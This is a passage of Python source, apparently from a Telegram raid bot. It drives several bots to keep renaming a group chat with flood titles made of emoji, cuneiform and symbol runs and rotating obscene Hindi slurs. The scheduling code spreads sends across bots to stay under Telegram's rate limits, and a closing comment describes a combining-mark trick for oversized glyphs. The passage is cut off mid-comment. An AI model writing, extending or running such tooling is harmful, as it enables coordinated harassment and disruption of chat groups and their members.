🍌𒐫𒐫𒐫𒐫𒐫??𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫∶",
        " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫ˑ", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫ꞏ", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫ᐧ", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫⁖", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫⁘",
    ]
    _idx  = [0]
    _last = [None]
    def _f():
        c = (txt + _sfx[_idx[0] % len(_sfx)])[:255]
        _idx[0] += 1
        if c == _last[0]:
            c = (txt + _sfx[_idx[0] % len(_sfx)])[:255]
            _idx[0] += 1
        _last[0] = c
        return c
    return _f

def _pure_nc_factory(txt: str) -> callable:
    last = _last()
    tmpl = [
        lambda t, e, s: f"꧁{t}꧂{s}",
        lambda t, e, s: f"⚡{t}🔥{s}",
        lambda t, e, s: f"💀{t}👑{s}",
        lambda t, e, s: f"𖤍{t}✦{s}",
        lambda t, e, s: f"♛{t}☄️{s}",
        lambda t, e, s: f"🌊{t}💎{s}",
        lambda t, e, s: f"{e}{t}{s}",
    ]
    def _f():
        fn = random.choice(tmpl)
        c  = fn(txt, rnd_emoji(), rnd_suffix())[:255]
        if c == last[0]:
            c = fn(txt, rnd_emoji(), rnd_suffix())[:255]
        last[0] = c
        return c
    return _f

_BOLD_MAP = str.maketrans(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
    "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"
)
_ITALIC_MAP = str.maketrans(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
    "𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘓𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻"
)
_CURSIVE_MAP = str.maketrans(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
    "𝑨𝑩𝑪𝑫𝑬𝑭𝑮𝑯𝑰𝑱𝑲𝑳𝑴𝑵𝑶𝑷𝑸𝑹𝑺𝑻𝑼𝑽𝑾𝑿𝒀𝒁𝒂𝒃𝒄𝒅𝒆𝒇𝒈𝒉𝒊𝒋𝒌𝒍𝒎𝒏𝒐𝒑𝒒𝒓𝒔𝒕𝒖𝒗𝒘𝒙𝒚𝒛"
)

def _font_factory(txt: str, style: str) -> callable:
    if style == "bold":
        styled = txt.translate(_BOLD_MAP)
    elif style == "italic":
        styled = txt.translate(_ITALIC_MAP)
    elif style == "cursive":
        styled = txt.translate(_CURSIVE_MAP)
    else:
        styled = txt
    return _pure_nc_factory(styled)

_EVA_TMPL = [
    lambda t, s: f"⚡ {t}{s}",
    lambda t, s: f"🔥 {t}{s}",
    lambda t, s: f"💀 {t}{s}",
    lambda t, s: f"𖤍 {t}{s}",
    lambda t, s: f"👑 {t}{s}",
    lambda t, s: f"🌊 {t}{s}",
    lambda t, s: f"🐉 {t}{s}",
    lambda t, s: f"💎 {t}{s}",
    lambda t, s: f"🌑 {t}{s}",
    lambda t, s: f"🔱 {t}{s}",
]

def _eva_factory(txt: str, idx: int) -> callable:
    last = _last()
    fn   = _EVA_TMPL[idx % len(_EVA_TMPL)]
    def _f():
        c = fn(txt, rnd_suffix())[:255]
        if c == last[0]:
            c = fn(txt, rnd_suffix())[:255]
        last[0] = c
        return c
    return _f

def _dead_factory(txt: str) -> callable:
    last = _last()
    _alt = [True]
    def _f():
        if _alt[0]:
            c = f"♛𝑵𝑶 𝑵𝑨𝑴𝑬  {txt}{rnd_suffix()}"[:255]
        else:
            c = f"⚜️𝑵𝑶 𝑵𝑨𝑴𝑬  {txt}{rnd_suffix()}"[:255]
        _alt[0] = not _alt[0]
        if c == last[0]:
            _alt[0] = not _alt[0]
            c = (f"♛𝑵𝑶 𝑵𝑨𝑴𝑬  {txt}{rnd_suffix()}" if _alt[0]
                 else f"⚜️𝑵𝑶 𝑵𝑨𝑴𝑬  {txt}{rnd_suffix()}")[:255]
        last[0] = c
        return c
    return _f

def _n_factory(txt: str) -> callable:
    last = _last()
    _alt = [True]
    def _f():
        if _alt[0]:
            c = f"𖤍𝑵𝑶 𝑵𝑨𝑴𝑬 𝑮𝑶𝑫 𝑯𝑬𝑹𝑬 {txt}{rnd_suffix()}"[:255]
        else:
            c = f"💀𝑵𝑶 𝑵𝑨𝑴𝑬 𝑮𝑶𝑫 𝑯𝑬𝑹𝑬 {txt}{rnd_suffix()}"[:255]
        _alt[0] = not _alt[0]
        if c == last[0]:
            _alt[0] = not _alt[0]
            c = (f"𖤍𝑵𝑶 𝑵𝑨𝑴𝑬 𝑮𝑶𝑫 𝑯𝑬𝑹𝑬 {txt}{rnd_suffix()}" if _alt[0]
                 else f"💀𝑵𝑶 𝑵𝑨𝑴𝑬 𝑮𝑶𝑫 𝑯𝑬𝑹𝑬 {txt}{rnd_suffix()}")[:255]
        last[0] = c
        return c
    return _f

_WAVE_SYMS = ["🌊","💧","🫧","🌀","🌬️","❄️","🌙","🌊","💎","🌟"]
def _wave_factory(txt: str) -> callable:
    last = _last()
    def _f():
        w = random.choice(_WAVE_SYMS)
        c = f"{w}{txt}{rnd_suffix()}"[:255]
        if c == last[0]:
            c = f"{random.choice(_WAVE_SYMS)} {txt}{rnd_suffix()}"[:255]
        last[0] = c
        return c
    return _f

def _save_templates():
    try:
        with open(TEMPLATES_FILE, "w") as f:
            json.dump(custom_templates, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def _custom_template_factory(template: str, txt: str) -> callable:
    """
    Placeholders in template:
      {t} or {txt}  — NC text supplied by user
      {w}           — random chud word (cycles: LUND TBKC TBR TMR ...)
      {e}           — random emoji
      {n}           — counter (1, 2, 3 ...)
      {wl}          — random left wrap char  (꧁ ♛ 🔱 ...)
      {wr}          — random right wrap char (꧂ ♛ 🌊 ...)
    """
    words  = list(_CHUD_WORDS)
    widx   = [0]
    ctr    = [0]
    last   = _last()

    def _f():
        widx[0] += 1
        ctr[0]  += 1
        w  = words[widx[0] % len(words)]
        e  = rnd_emoji()
        wl = random.choice(WRAP_L)
        wr = random.choice(WRAP_R)
        c  = (template
              .replace("{txt}", txt)
              .replace("{t}",   txt)
              .replace("{w}",   w)
              .replace("{e}",   e)
              .replace("{n}",   str(ctr[0]))
              .replace("{wl}",  wl)
              .replace("{wr}",  wr))[:255]
        if c == last[0]:
            c = (c + " ·")[:255]
        last[0] = c
        return c
    return _f


def _chud_nc_factory(txt: str) -> callable:
    """
    Template: {txt}𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫💥💥{WORD} 𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫 ➴ྀ࿐ ··
    Cycling words: LUND, TBKC, TBR, TMR, aarey चुदोड़े, BHEN CUDALE
    """
    words = list(_CHUD_WORDS)
    idx   = [0]
    last  = _last()

    def _f():
        word = words[idx[0] % len(words)]
        idx[0] += 1
        c = (
            f"{txt}"
            f"𒐫𒐫𒐫𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫💥💥"
            f"{word} "
            f"𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫 ➴ྀ࿐ ·· "
        )[:255]
        if c == last[0]:
            idx[0] += 1
            word2 = words[idx[0] % len(words)]
            c = (
                f"{txt}"
                f"𒐫𒐫𒐫𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫💥💥"
                f"{word2} "
                f"𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫 ➴ྀ࿐ ·· "
            )[:255]
        last[0] = c
        return c
    return _f


# ═══════════════════════════════════════════════════════
#  NC1 – NC100  :  100 unique templates, varied engines
#  No jitter. Per-bot flood state. Fast send cycles.
# ═══════════════════════════════════════════════════════

# (symbol_block, pre_wrap, post_wrap, repeat, alt_sym)
# alt_sym is mixed into even-numbered calls for variety
_NC100_SPECS: List[tuple] = [
    # nc1  – Elder Futhark ᛝ flood
    ("ᛝ",  "(",  ")",   72, "ᛝ"),
    # nc2  – Star rings ⟡
    ("⟡",  "",   "",    55, "⟡"),
    # nc3  – Sumerian 𒐫 dual-cuneiform
    ("𒐫",  "",   "",    60, "𒐬"),
    # nc4  – Khmer ornament ꧅
    ("꧅",  "꧅", "꧅",   44, "꧅"),
    # nc5  – Tai Tham ᯼
    ("᯼",  "",   "",    52, "᯼"),
    # nc6  – Cham ꩜
    ("꩜",  "〖", "〗",   36, "꩜"),
    # nc7  – Anglo-Saxon ᚦ
    ("ᚦ",  "⌈",  "⌉",   55, "ᚦ"),
    # nc8  – Othala ᛟ
    ("ᛟ",  "",   "",    50, "ᛟ"),
    # nc9  – Raido ᚱ
    ("ᚱ",  "᳐", "᳐",   46, "ᚱ"),
    # nc10 – Gebo ᚷ
    ("ᚷ",  "",   "",    48, "ᚷ"),
    # nc11 – Outlined diamond ◈
    ("◈",  "◈",  "◈",   30, "◇"),
    # nc12 – Hexagon ⬡
    ("⬡",  "",   "",    42, "⬢"),
    # nc13 – Bullseye ◉
    ("◉",  "｢",  "｣",   28, "◎"),
    # nc14 – Star cross ⊹
    ("⊹",  "",   "",    50, "✦"),
    # nc15 – Four-pointed ✦
    ("✦",  "✦",  "✦",   35, "✧"),
    # nc16 – Sparkle ✧
    ("✧",  "✧",  "✧",   32, "✦"),
    # nc17 – Circle cross ⟐
    ("⟐",  "",   "",    45, "⟐"),
    # nc18 – Asterisk ❋
    ("❋",  "❋",  "❋",   30, "✿"),
    # nc19 – Flower ✿
    ("✿",  "",   "",    40, "❀"),
    # nc20 – Snowflake ❄
    ("❄",  "❄",  "❄",   28, "❅"),
    # nc21 – Cross ✚
    ("✚",  "",   "",    48, "✙"),
    # nc22 – Circled dot ⊙
    ("⊙",  "⊙",  "⊙",   34, "⊚"),
    # nc23 – Trident ᛉ
    ("ᛉ",  "",   "",    52, "ᛃ"),
    # nc24 – Arrows ➶
    ("➶",  "",   "",    40, "➸"),
    # nc25 – Chess king ♛
    ("♛",  "♛",  "♛",   20, "♚"),
    # nc26 – Double-headed ⟺
    ("⟺",  "",   "",    35, "⟹"),
    # nc27 – White star ☆
    ("☆",  "☆",  "☆",   40, "★"),
    # nc28 – Black star ★
    ("★",  "",   "",    45, "☆"),
    # nc29 – Lightning ⚡ repeat
    ("⚡",  "",   "",    24, "💥"),
    # nc30 – Infinity ∞
    ("∞",  "∞",  "∞",   30, "∞"),
    # nc31 – Triangles ▲
    ("▲",  "",   "",    48, "△"),
    # nc32 – Diamonds ◆
    ("◆",  "◆",  "◆",   36, "◇"),
    # nc33 – Wave ≋
    ("≋",  "",   "",    50, "≈"),
    # nc34 – Pilcrow ¶
    ("¶",  "¶",  "¶",   32, "§"),
    # nc35 – Section §
    ("§",  "",   "",    42, "¶"),
    # nc36 – Lozenge ◊
    ("◊",  "◊",  "◊",   38, "◆"),
    # nc37 – Clubs ♣
    ("♣",  "",   "",    44, "♠"),
    # nc38 – Spades ♠
    ("♠",  "♠",  "♠",   36, "♣"),
    # nc39 – Music ♫
    ("♫",  "",   "",    40, "♪"),
    # nc40 – Note ♪
    ("♪",  "♪",  "♪",   36, "♫"),
    # nc41 – Devanagari ornament ꣎
    ("꣎ ", "",   "",    30, "ꣽ"),
    # nc42 – Tetragram ䷀-style line repeats ━
    ("━",  "┫",  "┣",   30, "─"),
    # nc43 – Box double ═
    ("═",  "╠",  "╣",   28, "─"),
    # nc44 – Block full █
    ("█",  "",   "",    40, "▓"),
    # nc45 – Block light ░
    ("░",  "",   "",    42, "▒"),
    # nc46 – Circled plus ⊕
    ("⊕",  "⊕",  "⊕",   32, "⊗"),
    # nc47 – Circled times ⊗
    ("⊗",  "",   "",    36, "⊕"),
    # nc48 – Nabla ∇
    ("∇",  "∇",  "∇",   40, "△"),
    # nc49 – Therefore ∴
    ("∴",  "",   "",    48, "∵"),
    # nc50 – Because ∵
    ("∵",  "∵",  "∵",   44, "∴"),
    # nc51 – Small circle ∘
    ("∘",  "",   "",    55, "·"),
    # nc52 – Bullet ·
    ("·",  "»",  "«",   50, "•"),
    # nc53 – Interpunct •
    ("•",  "",   "",    48, "·"),
    # nc54 – Tilde wave ~~~
    ("~",  "",   "",    55, "≈"),
    # nc55 – Pipe |
    ("|",  "║",  "║",   44, "¦"),
    # nc56 – Broken bar ¦
    ("¦",  "",   "",    50, "|"),
    # nc57 – Right guillemet »
    ("»",  "",   "",    40, "›"),
    # nc58 – Left guillemet «
    ("«",  "",   "",    40, "‹"),
    # nc59 – Degree °
    ("°",  "°",  "°",   50, "·"),
    # nc60 – Prime ′
    ("′",  "",   "",    55, "″"),
    # nc61 – OGham ᚁ
    ("ᚁ",  "",   "",    50, "ᚂ"),
    # nc62 – Ogham ᚃ
    ("ᚃ",  "ᚁ", "ᚁ",   44, "ᚄ"),
    # nc63 – Linear B 𐀀
    ("𐀀",  "",   "",    36, "𐀁"),
    # nc64 – Vai ꓀
    ("ꓸ",  "",   "",    40, "ꓹ"),
    # nc65 – Bopomofo ㄅ
    ("ㄅ", "〔", "〕",   24, "ㄆ"),
    # nc66 – Katakana ア
    ("ア",  "",   "",    30, "イ"),
    # nc67 – CJK stroke ㇰ
    ("ㇰ", "",   "",    32, "ㇱ"),
    # nc68 – Alchemical 🜁
    ("🜁",  "🜁", "🜁",  18, "🜂"),
    # nc69 – Alchemical 🜃
    ("🜃",  "",   "",    20, "🜄"),
    # nc70 – Domino 🁣
    ("🁣",  "",   "",    18, "🁤"),
    # nc71 – Playing card 🂡
    ("🂡",  "",   "",    16, "🂱"),
    # nc72 – Dice ⚀
    ("⚀",  "⚀",  "⚀",   20, "⚅"),
    # nc73 – Chess pawn ♟
    ("♟",  "",   "",    28, "♙"),
    # nc74 – Target ◎
    ("◎",  "◎",  "◎",   30, "◉"),
    # nc75 – Squared cross ☩
    ("☩",  "",   "",    36, "☨"),
    # nc76 – Aries ♈
    ("♈",  "♈",  "♈",   22, "♑"),
    # nc77 – Taurus ♉
    ("♉",  "",   "",    24, "♊"),
    # nc78 – Scorpius ♏
    ("♏",  "♏",  "♏",   22, "♐"),
    # nc79 – Sun ☀
    ("☀",  "",   "",    26, "☁"),
    # nc80 – Moon ☽
    ("☽",  "☽",  "☽",   24, "☾"),
    # nc81 – Comet ☄
    ("☄",  "",   "",    28, "⭐"),
    # nc82 – Planet ♄
    ("♄",  "♄",  "♄",   22, "♃"),
    # nc83 – Mercury ☿
    ("☿",  "",   "",    28, "♀"),
    # nc84 – Venus ♀
    ("♀",  "♀",  "♀",   24, "♂"),
    # nc85 – Mars ♂
    ("♂",  "",   "",    28, "♀"),
    # nc86 – Fleur-de-lis ⚜
    ("⚜",  "⚜",  "⚜",   20, "♕"),
    # nc87 – Hammer ⚒
    ("⚒",  "",   "",    26, "⚙"),
    # nc88 – Gear ⚙
    ("⚙",  "⚙",  "⚙",   22, "⚒"),
    # nc89 – Atom ⚛
    ("⚛",  "",   "",    26, "⚗"),
    # nc90 – Radiation ☢
    ("☢",  "☢",  "☢",   20, "☣"),
    # nc91 – Biohazard ☣
    ("☣",  "",   "",    22, "☢"),
    # nc92 – Peace ☮
    ("☮",  "☮",  "☮",   22, "✌"),
    # nc93 – Om ॐ
    ("ॐ",  "",   "",    28, "☯"),
    # nc94 – Yin-Yang ☯
    ("☯",  "☯",  "☯",   22, "ॐ"),
    # nc95 – Ankh ☥
    ("☥",  "",   "",    30, "✝"),
    # nc96 – Cross ✝
    ("✝",  "✝",  "✝",   26, "☥"),
    # nc97 – Caduceus ⚕
    ("⚕",  "",   "",    28, "⚖"),
    # nc98 – Scales ⚖
    ("⚖",  "⚖",  "⚖",   22, "⚕"),
    # nc99 – Hourglass ⌛
    ("⌛",  "",   "",    26, "⏳"),
    # nc100 – Infinity loop ♾
    ("♾",  "♾",  "♾",   20, "∞"),
    # ═══════════════════════════════════════════════════════
    # NC101 – NC115 : 15 NEW UNIQUE NCs — Sexy templates
    # ═══════════════════════════════════════════════════════
    # nc101 – Sumerian Dingir 𒀭 (Divine marker — ultra rare)
    ("𒀭", "",   "",    48, "𒀭"),
    # nc102 – Norse Uruz rune ᚢ (Strength rune)
    ("ᚢ",  "",   "",    52, "ᚣ"),
    # nc103 – Asterism ⁂ (Triple-star cluster)
    ("⁂",  "⁂",  "⁂",   28, "✲"),
    # nc104 – Double Exclamation ‼ (Hype flood)
    ("‼",  "‼",  "‼",   38, "⁉"),
    # nc105 – Midline Ellipsis ⋯ (Infinite dots)
    ("⋯",  "⋰",  "⋯",   40, "⋱"),
    # nc106 – Reference Mark ※ (Star-burst flood)
    ("※",  "※",  "※",   30, "⁂"),
    # nc107 – Circled Star ❂ (8-petal burst)
    ("❂",  "❁",  "❂",   26, "❀"),
    # nc108 – White Circle ○ (Clean circle flood)
    ("○",  "◯",  "○",   40, "◌"),
    # nc109 – Inverted Lazy S ∾ (Infinity wave)
    ("∾",  "∽",  "∾",   44, "≀"),
    # nc110 – White Diamond ◇ (Soft diamond)
    ("◇",  "◆",  "◇",   36, "◊"),
    # nc111 – Flower Punct ⁕ (Rare flower)
    ("⁕",  "⁑",  "⁕",   42, "⁑"),
    # nc112 – Position Indicator ⌖ (Target symbol)
    ("⌖",  "⌖",  "⌖",   36, "⌗"),
    # nc113 – Dotted Triangle ⌬ (Tech triangle)
    ("⌬",  "△",  "⌬",   32, "▽"),
    # nc114 – Shekel Sign ₪ (Currency flood)
    ("₪",  "₪",  "₪",   42, "₫"),
    # nc115 – Alchemical Earth 🜃 (Elemental)
    ("🜃",  "🜁",  "🜃",   20, "🜄"),
]

# Engine assignment per NC number (1-indexed)
def _nc100_engine_key(n: int) -> str:
    if n <= 25:
        return "chud"
    elif n <= 50:
        return "silk"
    elif n <= 75:
        return "stagger"
    elif n <= 100:
        return "god"
    else:   # nc101–nc115: all use fastest engine
        return "chud"

async def _nc100_raw_engine(chat_id, bots, stop_event, name_factory, step: float):
    """
    NC1-NC100 engine — identical architecture to CHUD, parameterised by step.

    Rules:
    • Per-bot independent flood — one bot flooded, others keep running.
    • Absolute scheduling — next_send += CYCLE, API latency never bleeds in.
    • Staggered cold start — bot[i] waits i*step before first send.
    • On RetryAfter — that bot backs off, resumes at staggered position.
    • NO chat-wide shared state — it caused burst-fire on recovery (re-flood).
    • Clean stop — stop_event fires → workers self-exit → no shield needed.
    """
    N = len(bots)
    if N == 0:
        return
    CYCLE         = step * N
    MAX_FLOOD     = 2.5   # Hard cap: flood never blocks more than 2.5s
    flooded_until = [0.0] * N

    async def _worker(idx: int):
        bot       = bots[idx]
        next_send = time.monotonic() + idx * step

        while not stop_event.is_set():
            now = time.monotonic()

            # Per-bot flood wait — other bots unaffected
            if flooded_until[idx] > now:
                rem = flooded_until[idx] - now
                if await _wait_ev(stop_event, min(rem, 0.1)):
                    return
                continue

            # Wait for our absolute slot
            wait = next_send - time.monotonic()
            if wait > 0.001:
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=wait)
                    return          # stop_event fired
                except asyncio.TimeoutError:
                    pass
            if stop_event.is_set():
                return

            try:
                await bot.set_chat_title(chat_id, name_factory()[:255])
                next_send += CYCLE                      # absolute, no drift
            except RetryAfter as e:
                pause = min(float(e.retry_after) + 0.1, MAX_FLOOD)
                flooded_until[idx] = time.monotonic() + pause
                # Stagger resume so this bot doesn't fire same time as others
                next_send = flooded_until[idx] + idx * step * 0.5
            except (BadRequest, Forbidden):
                next_send += CYCLE * 2
            except (TimedOut, NetworkError):
                next_send = time.monotonic() + 1.0
            except asyncio.CancelledError:
                return
            except Exception:
                next_send += CYCLE

    tasks = [asyncio.create_task(_worker(i)) for i in range(N)]
    try:
        await stop_event.wait()
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)


def _nc3_factory(txt: str) -> callable:
    """
    NC3 — pure Sumerian cuneiform flood.
    Single fixed template: txt followed by maximum-density alternating 𒐫𒐬 chars.
    No style rotation — one clean, long template only.
    """
    TAIL_TAGS = ["᳀","᳁","᳂","᳃","᳄","᳅","᳆","᳇","᷀","᷁"]
    FLOOD     = ("𒐫𒐬" * 130)  # pre-built alternating flood, sliced to fit
    ctr = [0]

    def _f() -> str:
        tag    = TAIL_TAGS[ctr[0] % len(TAIL_TAGS)]
        ctr[0] += 1
        # Keep message light: txt capped at 8 chars, total flood ~60 chars
        prefix = txt[:8]
        limit  = 60 - len(tag) - 1
        remain = limit - len(prefix)
        fill   = FLOOD[:remain]
        return f"{prefix}{fill} {tag}"

    return _f


def _nc100_factory(n: int, txt: str) -> callable:
    """
    LONG-NC factory — rich, fills to ~250 chars, guaranteed unique per call.

    5 template styles rotate across NCs for maximum variety.
    Cycling words + 10 tail-tags = zero duplicate risk.

    Style 0 (1,6,11,...) : txt + dense-flood + burst-word-burst + back-flood
    Style 1 (2,7,12,...) : burst + flood + txt·word + alt-flood + burst
    Style 2 (3,8,13,...) : txt + alt-mix + burst·word·burst + sym-flood
    Style 3 (4,9,14,...) : (pre||burst) + flood + txt·word + flood + (post||burst)
    Style 4 (5,10,15,...): sym-half + burst + txt·word + burst + sym-half
    """
    if n == 3:
        return _nc3_factory(txt)

    idx = n - 1
    sym, pre, post, rep, alt = _NC100_SPECS[idx]

    TAIL_TAGS = ["᳀","᳁","᳂","᳃","᳄","᳅","᳆","᳇","᷀","᷁"]
    words     = list(_CHUD_WORDS)
    # 20 unique burst chars — one per every-other NC
    BURSTS = [
        "💥","⚡","🔥","✨","💎","👑","🌟","🔱","🌊","⚔️",
        "🩸","☄","🐉","🌙","💫","🔮","🧿","🪬","🌺","💀",
    ]
    burst = BURSTS[idx % len(BURSTS)]
    style = idx % 5

    ctr  = [0]
    widx = [0]

    def _build(c: int) -> str:
        s    = sym if (c % 3 != 1) else alt   # 2/3 main sym, 1/3 alt
        s2   = alt if alt != sym else sym
        word = words[widx[0] % len(words)]; widx[0] += 1
        tag  = TAIL_TAGS[c % len(TAIL_TAGS)]

        # Flood lengths derived from each NC's repeat spec
        # rep gives each NC its own visual weight — bigger rep = denser flood
        f1 = max(12, min(24, rep // 3))
        f2 = max(8,  min(16, rep // 5))

        if style == 0:
            core = f"{txt}{s*f1}{word} {burst}{s*f2}{burst}"
        elif style == 1:
            core = f"{burst}{s*f1}{txt} {word} {s2*f2}{burst}"
        elif style == 2:
            # Alternating sym/alt mix for visual texture
            mix  = (s + s2) * (f1 // 2)
            core = f"{txt}{mix}{burst}{word}{burst}{s*f2}"
        elif style == 3:
            p  = (pre  if pre  else burst)
            po = (post if post else burst)
            core = f"{p}{s*f1}{txt} {word} {s*f2}{po}"
        else:
            h    = f1 // 2
            core = f"{s*h}{burst}{txt} {word}{burst}{s*h}"

        # Pad with sym to fill up to 246 chars, then append " tag"
        core = core[:246]
        remaining = 246 - len(core)
        if remaining > 0:
            pad = (s * (remaining // max(len(s), 1) + 1))[:remaining]
            core = (core + pad)[:246]
        return f"{core} {tag}"

    def _f() -> str:
        c = ctr[0]; ctr[0] += 1
        return _build(c)[:255]

    return _f

# ═══════════════════════════════════════════════════════════════════════════════
#  ⚔️  EVA SIGNATURE ELITE NCs  ⚔️
#  5 legendary commands — hand-crafted long templates, 0.09 s delay, zero jitter
#  Commands: -sharingan · -akatsuki · -madara · -susanoo · -itachi
# ═══════════════════════════════════════════════════════════════════════════════

_ELITE_TAIL  = ["᳀","᳁","᳂","᳃","᳄","᳅","᳆","᳇","᷀","᷁","᷂","᷃","᷄","᷅","᷆"]
_ELITE_DELAY = 0.30   # 10 bots × 0.30s = 3.3 sends/sec → no flood

# ──────────────────────────────────────────────────────────────────────────────
#  🔑  THE TRICK (read before touching these factories)
#
#  Every UNIT below = base_sym + 2 combining marks = 3 Unicode codepoints.
#  Telegram counts it as 3 chars  →  at 246 limit we get ~82 units.
#  But Telegram RENDERS each unit as ONE glyph surrounded by enormous
#  Cyrillic / Mathematical enclosing shapes:
#
#    U+0488  ҈  Combining Cyrillic Thousands Sign  → giant ring around glyph
